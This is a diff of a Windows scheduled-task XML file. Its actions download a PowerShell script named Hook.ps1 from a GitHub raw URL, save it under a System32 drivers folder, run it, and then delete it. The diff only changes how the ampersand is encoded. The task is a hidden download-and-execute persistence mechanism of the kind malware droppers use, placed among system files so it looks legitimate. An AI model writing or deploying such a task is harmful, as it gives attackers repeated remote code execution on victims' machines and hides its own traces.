@@ -45,19 +45,19 @@
   <Actions Context="Author">
     <Exec>
       <Command>powershell.exe</Command>
-      <Arguments>-command "&amp; Remove-Item C:\Windows\System32\drivers\en-US\Hook.ps1"</Arguments>
+      <Arguments>-command "& Remove-Item C:\Windows\System32\drivers\en-US\Hook.ps1"</Arguments>
     </Exec>
     <Exec>
       <Command>powershell.exe</Command>
-      <Arguments>"&amp; {$client = new-object System.Net.WebClient;$client.DownloadFile('https://raw.githubusercontent.com/diggles9991/MG/master/Hook.ps1','C:\Windows\System32\drivers\en-US\Hook.ps1')}"</Arguments>
+      <Arguments>"& {$client = new-object System.Net.WebClient;$client.DownloadFile('https://raw.githubusercontent.com/diggles9991/MG/master/Hook.ps1','C:\Windows\System32\drivers\en-US\Hook.ps1')}"</Arguments>
     </Exec>
     <Exec>
       <Command>powershell.exe</Command>
-      <Arguments>-command "&amp; C:\Windows\System32\drivers\en-US\Hook.ps1"</Arguments>
+      <Arguments>-command "& C:\Windows\System32\drivers\en-US\Hook.ps1"</Arguments>
     </Exec>
     <Exec>
       <Command>powershell.exe</Command>
-      <Arguments>-command "&amp; Remove-Item C:\Windows\System32\drivers\en-US\Hook.ps1"</Arguments>
+      <Arguments>-command "& Remove-Item C:\Windows\System32\drivers\en-US\Hook.ps1"</Arguments>
 </Exec>
   </Actions>
 </Task>
